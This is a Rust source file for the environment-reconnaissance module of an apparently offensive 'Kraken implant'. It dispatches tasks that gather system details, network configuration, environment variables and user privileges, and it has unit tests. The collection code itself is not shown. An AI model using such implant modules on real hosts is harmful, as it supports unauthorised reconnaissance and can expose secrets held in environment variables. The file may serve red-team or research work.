//! mod-env: Environment information module for Kraken implant
//!
//! Provides system, network, and user information gathering:
//! - get_system_info: OS, hostname, memory, CPU counts, uptime
//! - get_network_info: network interfaces, DNS, default gateway
//! - get_env_vars: environment variable enumeration
//! - whoami: current user, domain, groups, privilege level

use common::{KrakenError, Module, ModuleId, TaskId, TaskResult};
use prost::Message;
use protocol::{env_task, EnvTask};

mod network;
mod system;
mod user;

pub struct EnvModule {
    id: ModuleId,
}

impl EnvModule {
    pub fn new() -> Self {
        Self {
            id: ModuleId::new("env"),
        }
    }
}

impl Default for EnvModule {
    fn default() -> Self {
        Self::new()
    }
}

impl Module for EnvModule {
    fn id(&self) -> &ModuleId {
        &self.id
    }

    fn name(&self) -> &'static str {
        "Environment"
    }

    fn version(&self) -> &'static str {
        env!("CARGO_PKG_VERSION")
    }

    fn handle(&self, _task_id: TaskId, task_data: &[u8]) -> Result<TaskResult, KrakenError> {
        let task: EnvTask =
            EnvTask::decode(task_data).map_err(|e| KrakenError::Protocol(e.to_string()))?;

        match task.operation {
            Some(env_task::Operation::SystemInfo(_)) => {
                let info = system::get_system_info()?;
                Ok(TaskResult::EnvSystem(info))
            }
            Some(env_task::Operation::NetworkInfo(_)) => {
                let info = network::get_network_info()?;
                Ok(TaskResult::EnvNetwork(info))
            }
            Some(env_task::Operation::EnvVars(_)) => {
                let vars = system::get_env_vars()?;
                Ok(TaskResult::EnvVars(vars))
            }
            Some(env_task::Operation::Whoami(_)) => {
                let info = user::whoami()?;
                Ok(TaskResult::EnvWhoAmI(info))
            }
            None => Err(KrakenError::Protocol("missing env operation".into())),
        }
    }
}

// For dynamic loading support
#[cfg(feature = "dynamic-entry")]
common::kraken_module_entry!(EnvModule);

#[cfg(test)]
mod tests {
    use super::*;
    use protocol::{EnvTask, GetSystemInfo, GetNetworkInfo, GetEnvVars, WhoAmI};

    #[test]
    fn test_module_id() {
        let module = EnvModule::new();
        assert_eq!(module.id().as_str(), "env");
        assert_eq!(module.name(), "Environment");
    }

    #[test]
    fn test_invalid_task_data() {
        let module = EnvModule::new();
        let result = module.handle(TaskId::new(), &[0xFF, 0xFE]);
        assert!(result.is_err());
    }

    #[test]
    fn test_get_system_info() {
        let module = EnvModule::new();
        let task = EnvTask {
            operation: Some(env_task::Operation::SystemInfo(GetSystemInfo {})),
        };
        let task_data = task.encode_to_vec();
        let result = module.handle(TaskId::new(), &task_data);
        assert!(result.is_ok());
        if let Ok(TaskResult::EnvSystem(info)) = result {
            assert!(!info.os_name.is_empty());
            assert!(info.cpu_count > 0);
        } else {
            panic!("unexpected result type");
        }
    }

    #[test]
    fn test_get_env_vars() {
        let module = EnvModule::new();
        let task = EnvTask {
            operation: Some(env_task::Operation::EnvVars(GetEnvVars {})),
        };
        let task_data = task.encode_to_vec();
        let result = module.handle(TaskId::new(), &task_data);
        assert!(result.is_ok());
        if let Ok(TaskResult::EnvVars(vars)) = result {
            assert!(!vars.variables.is_empty());
        } else {
            panic!("unexpected result type");
        }
    }

    #[test]
    fn test_get_network_info() {
        let module = EnvModule::new();
        let task = EnvTask {
            operation: Some(env_task::Operation::NetworkInfo(GetNetworkInfo {})),
        };
        let task_data = task.encode_to_vec();
        let result = module.handle(TaskId::new(), &task_data);
        assert!(result.is_ok());
        if let Ok(TaskResult::EnvNetwork(_info)) = result {
            // network info gathered successfully
        } else {
            panic!("unexpected result type");
        }
    }

    #[test]
    fn test_whoami() {
        let module = EnvModule::new();
        let task = EnvTask {
            operation: Some(env_task::Operation::Whoami(WhoAmI {})),
        };
        let task_data = task.encode_to_vec();
        let result = module.handle(TaskId::new(), &task_data);
        assert!(result.is_ok());
        if let Ok(TaskResult::EnvWhoAmI(info)) = result {
            assert!(!info.username.is_empty());
        } else {
            panic!("unexpected result type");
        }
    }
}
